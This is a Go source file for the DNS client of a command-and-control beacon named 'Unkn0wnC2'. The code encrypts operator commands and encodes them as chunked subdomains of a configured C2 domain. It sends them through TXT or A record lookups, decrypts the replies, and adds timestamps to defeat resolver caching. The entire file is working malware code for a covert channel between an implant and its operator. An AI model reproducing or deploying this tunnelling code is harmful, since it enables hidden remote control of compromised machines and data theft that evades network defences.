// Package main implements DNS client functionality for the Unkn0wnC2 beacon.
// This handles DNS query construction, response parsing, and the core DNS
// communication protocol for C2 operations.
package main

import (
	"fmt"
	"net"
	"strings"
	"time"
)

// DNSClient handles DNS-based C2 communication
type DNSClient struct {
	config *Config
	aesKey []byte
}

// newDNSClient creates a new DNS C2 client with embedded config
// newDNSClient creates a DNS client with configured timeout and resolver settings
// for communicating with the C2 DNS server.
func newDNSClient() *DNSClient {
	config := getConfig()
	aesKey := generateAESKey(config.EncryptionKey)

	return &DNSClient{
		config: &config,
		aesKey: aesKey,
	}
}

// encodeCommand encrypts and encodes a command string for DNS transmission
func (c *DNSClient) encodeCommand(command string) (string, error) {
	encoded, err := encryptAndEncode(command, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt and encode command: %v", err)
	}
	return encoded, nil
}

// decodeResponse decodes and decrypts a DNS response back to readable format
func (c *DNSClient) decodeResponse(encoded string) (string, error) {
	decoded, err := decodeAndDecrypt(encoded, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt response: %v", err)
	}
	return decoded, nil
}

// sendDNSQuery sends a command via DNS query
func (c *DNSClient) sendDNSQuery(command string) (string, error) {
	encodedCmd, err := c.encodeCommand(command)
	if err != nil {
		return "", fmt.Errorf("failed to encode command: %v", err)
	}

	// Limit command length
	if len(encodedCmd) > c.config.MaxCommandLength {
		return "", fmt.Errorf("command too long: %d characters (max %d)", len(encodedCmd), c.config.MaxCommandLength)
	}

	// Create DNS query with encoded command as subdomain
	// Split into 62-character chunks to comply with DNS label limits
	var labels []string
	for len(encodedCmd) > 0 {
		chunkSize := len(encodedCmd)
		if chunkSize > 62 {
			chunkSize = 62
		}
		labels = append(labels, encodedCmd[:chunkSize])
		encodedCmd = encodedCmd[chunkSize:]
	}

	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), c.config.ServerDomain)

	var result string

	// Use standard library DNS resolution only (simplified)
	for attempt := 0; attempt < c.config.RetryAttempts; attempt++ {
		switch c.config.QueryType {
		case "TXT":
			txtRecords, lookupErr := net.LookupTXT(queryName)
			if lookupErr == nil && len(txtRecords) > 0 {
				// Try to decode TXT records
				for _, txt := range txtRecords {
					decoded, decErr := c.decodeResponse(txt)
					if decErr == nil {
						result = decoded
					} else {
						result = fmt.Sprintf("Raw TXT: %s", txt)
					}
					break
				}
				err = nil
				break
			}
			err = lookupErr

		default:
			addrs, lookupErr := net.LookupHost(queryName)
			if lookupErr == nil && len(addrs) > 0 {
				result = fmt.Sprintf("DNS Response IPs: %v", addrs)
				err = nil
				break
			}
			err = lookupErr
		}

		if err == nil {
			break
		}

		if attempt < c.config.RetryAttempts-1 {
			time.Sleep(time.Duration(attempt+1) * time.Second)
		}
	}

	if err != nil {
		return "", fmt.Errorf("DNS query failed after %d attempts: %v", c.config.RetryAttempts, err)
	}

	return result, nil
}

// sendCommand is the main interface for sending commands
func (c *DNSClient) sendCommand(command string) (string, error) {
	if strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("empty command")
	}

	// Add timestamp to command to bypass DNS caching on recursive resolvers
	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	commandWithTimestamp := fmt.Sprintf("%s|%s", command, timestamp)

	return c.sendDNSQuery(commandWithTimestamp)
}
